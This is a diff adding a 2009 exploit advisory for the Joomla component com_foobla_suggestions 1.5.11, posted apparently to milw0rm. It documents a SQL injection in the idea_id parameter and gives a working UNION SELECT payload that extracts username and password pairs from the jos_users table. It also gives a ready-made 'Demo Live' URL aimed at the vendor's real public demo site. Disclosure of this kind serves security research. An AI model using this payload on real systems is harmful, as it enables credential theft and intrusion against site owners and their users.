@@ -1,0 +1,49 @@
+-----------------------------------------------------------------------------------------
+joomla component com_foobla_suggestions (idea_id) SQL Injection Vulnerability
+-----------------------------------------------------------------------------------------
+
+Author         : Chip D3 Bi0s
+Email          : chipdebios[alt+64]gmail.com
+Date           : 15 September 2009
+Critical Lvl   : Moderate
+Impact	       : Exposure of sensitive information
+Where	       : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application   : foobla Suggestions
+version       : 1.5.11
+Developer     : foobla
+License       : GPL            type  : Commercial
+Date Added    : 15 September 2009
+Demo          : http://demo.foobla.com/foobla-suggestions-joomla/                            
+Download      : http://foobla.com/products/featured-joomla-extensions/foobla-suggestions-for-joomla.html
+Description   :
+
+Have you ever used Uservoice? Would you like to have something
+similar on Joomla but with unlimited features and no monthly fee?
+The foobla Suggestions allows you to collect ideas, suggestions,
+and votes from your cutomers. 
+---------------------------------------------------------------------------
+
+
+I.SQL injection (idea_id)
+Poc/Exploit:
+~~~~~~~~~
+
+http://127.0.0.1/[path]/index.php?option=com_foobla_suggestions&controller=comment&idea_id=[Sqlinjection]
+
+[Sqlinjection]= null+union+select+1,concat(username,0x3a,password),3,4,5,6,7,8,9,10,11,12+from+jos_users
+
+
+Demo Live:
+~~~~~~~
+http://demo.foobla.com/foobla-suggestions-joomla/index.php?option=com_foobla_suggestions&controller=comment&idea_id=null+union+select+1,concat(username,0x3a,password),3,4,5,6,7,8,9,10,11,12+from+jos_users
+
++++++++++++++++++++++++++++++++++++++++
+#[!] Produced in South America
++++++++++++++++++++++++++++++++++++++++
+
+# milw0rm.com [2009-09-16]
